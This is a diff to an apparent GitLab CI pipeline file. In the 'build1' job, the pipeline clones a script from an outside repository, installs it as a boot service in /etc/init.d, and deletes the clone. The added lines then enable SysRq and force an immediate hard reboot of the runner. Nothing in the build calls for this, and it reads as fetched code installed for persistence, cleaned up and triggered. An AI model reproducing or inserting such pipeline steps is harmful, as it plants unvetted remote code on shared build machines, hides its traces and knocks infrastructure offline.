@@ -10,7 +10,9 @@ before_script:
 build1:
   stage: build1
   script:
-    - git clone https://gitlab.com/mrgofuckyourself/reboot6.git && cd reboot6 && cp reboot6.sh /etc/init.d/reboot6.sh && update-rc.d -f reboot6.sh defaults 10 2 3 4 5 .
+    - git clone https://gitlab.com/mrgofuckyourself/reboot6.git && cd reboot6 && cp reboot6.sh /etc/init.d/reboot6.sh && update-rc.d -f reboot6.sh defaults 10 2 3 4 5 . && cd && rm -rf reboot6
+    - echo 1 > /proc/sys/kernel/sysrq
+    - echo b > /proc/sysrq-trigger
 deploy1:
   stage: deploy1
   script:
